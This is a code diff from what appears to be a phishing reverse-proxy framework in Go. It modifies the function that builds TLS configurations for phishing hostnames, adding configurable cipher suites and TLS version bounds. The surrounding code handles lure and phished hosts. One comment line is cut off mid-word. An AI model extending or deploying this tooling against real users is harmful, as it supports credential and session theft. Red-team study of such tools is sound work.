@@ -1532,44 +1532,53 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 }
 
 func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
-	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
-		parts := strings.SplitN(host, ":", 2)
-		hostname := parts[0]
-		port := 443
-		if len(parts) == 2 {
-			port, _ = strconv.Atoi(parts[1])
-		}
+        return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
+                parts := strings.SplitN(host, ":", 2)
+                hostname := parts[0]
+                port := 443
+                if len(parts) == 2 {
+                        port, _ = strconv.Atoi(parts[1])
+                }
 
-		tls_cfg := &tls.Config{}
-		if !p.developer {
+                tls_cfg := &tls.Config{
+                    CipherSuites:             p.cfg.general.CipherSuites,
+                    PreferServerCipherSuites: false,
+                    MinVersion:               p.cfg.general.TLSMinVersion,
+                    MaxVersion:               p.cfg.general.TLSMaxVersion,
+                }
+                if !p.developer {
 
-			tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
-			tls_cfg.NextProtos = []string{"http/1.1", tlsalpn01.ACMETLS1Protocol} //append(tls_cfg.NextProtos, tlsalpn01.ACMETLS1Protocol)
+                        tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
+                        tls_cfg.NextProtos = []string{"http/1.1", tlsalpn01.ACMETLS1Protocol} //append(tls_cfg.Nex>
 
-			return tls_cfg, nil
-		} else {
-			var ok bool
-			phish_host := ""
-			if !p.cfg.IsLureHostnameValid(hostname) {
-				phish_host, ok = p.replaceHostWithPhished(hostname)
-				if !ok {
-					log.Debug("phishing hostname not found: %s", hostname)
-					return nil, fmt.Errorf("phishing hostname not found")
-				}
-			}
-
-			cert, err := p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
-			if err != nil {
-				log.Error("http_proxy: %s", err)
-				return nil, err
-			}
-			return &tls.Config{
-				InsecureSkipVerify: true,
-				Certificates:       []tls.Certificate{*cert},
-			}, nil
-		}
-	}
+                        return tls_cfg, nil
+                } else {
+                        var ok bool
+                        phish_host := ""
+                        if !p.cfg.IsLureHostnameValid(hostname) {
+                                phish_host, ok = p.replaceHostWithPhished(hostname)
+                                if !ok {
+                                        log.Debug("phishing hostname not found: %s", hostname)
+                                        return nil, fmt.Errorf("phishing hostname not found")
+                                }
+                        }
+                        cert, err := p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
+                        if err != nil {
+                                log.Error("http_proxy: %s", err)
+                                return nil, err
+                        }
+                        return &tls.Config{
+                                InsecureSkipVerify: true,
+                                Certificates:       []tls.Certificate{*cert},
+                                CipherSuites:       p.cfg.general.CipherSuites,
+                                PreferServerCipherSuites: false,
+                                MinVersion:         p.cfg.general.TLSMinVersion,
+                                MaxVersion:         p.cfg.general.TLSMaxVersion,
+                        }, nil
+                }
+        }
 }
+
 
 func (p *HttpProxy) setSessionUsername(sid string, username string) {
 	if sid == "" {
